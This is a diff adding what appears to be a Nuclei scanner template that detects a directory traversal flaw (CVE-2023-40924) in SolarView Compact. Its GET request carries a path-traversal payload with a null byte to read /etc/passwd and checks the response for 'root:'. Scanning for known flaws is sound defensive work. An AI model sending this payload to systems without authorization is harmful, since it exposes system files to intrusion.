@@ -1,0 +1,28 @@
+id: solarview-compact-directory-traversal
+info:
+  name: SolarView Compact Directory Traversal Vulnerability (CVE-2023-40924)
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: cve,cve2023,path-traversal
+  description: |
+    The SolarView Compact application is vulnerable to a directory traversal
+    attack, allowing attackers to access sensitive files such as /etc/passwd.
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/downloader.php?file=../../../../../../../../etc/passwd%00.jpg"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "bin"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
